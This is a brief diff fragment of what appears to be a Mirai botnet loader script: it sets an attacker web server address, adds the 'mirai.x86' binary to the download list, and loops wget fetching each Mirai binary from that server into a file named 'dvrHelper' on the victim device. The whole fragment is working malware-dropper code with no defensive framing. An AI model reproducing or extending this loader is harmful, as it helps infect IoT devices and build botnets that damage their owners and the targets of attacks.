@@ -8,7 +8,7 @@ echo "#!/bin/sh
 WEBSERVER=\"$SERVER_IP:80\"
  
  
-BINARIES=\"mirai.dbg\"
+BINARIES=\"mirai.dbg mirai.x86\"
  
 for Binary in \$BINARIES; do
     wget http://\$WEBSERVER/bins/\$Binary -O dvrHelper
